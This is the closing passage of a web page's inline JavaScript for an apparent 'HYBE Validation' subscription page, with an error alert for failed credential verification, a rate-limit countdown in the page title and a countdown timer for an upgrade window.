        } else {
          showErrorAlert('Verification Failed', result.message || 'Invalid subscription credentials.', result.support_reference || null);
        }
      } catch (err) {
        throw err;
      }
    }

    // Rate limit countdown shown in a subtle toast
    function startRateLimitCountdown(seconds) {
      let remaining = seconds;
      const id = setInterval(() => {
        if (remaining <= 0) { clearInterval(id); showToast('info', 'Rate Limit Lifted', 'You can try again now.'); rateLimitResetAt = null; return; }
        document.title = `Retry in ${remaining}s — HYBE Validation`;
        remaining -= 1;
      }, 1000);
    }

    // Countdown timer for upgrade window (preserve existing behaviour)
    function startCountdownTimer(expirationDate) {
      const daysEl = document.getElementById('days');
      const hoursEl = document.getElementById('hours');
      const minutesEl = document.getElementById('minutes');
      const secondsEl = document.getElementById('seconds');

      function updateTimer() {
        const now = new Date(); const timeLeft = expirationDate - now;
        if (timeLeft <= 0) { daysEl.textContent = '0'; hoursEl.textContent = '0'; minutesEl.textContent = '0'; secondsEl.textContent = '0'; return; }
        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
        daysEl.textContent = days; hoursEl.textContent = hours; minutesEl.textContent = minutes; secondsEl.textContent = seconds;
      }

      updateTimer(); setInterval(updateTimer, 1000);
    }

  </script>
</body>
</html>
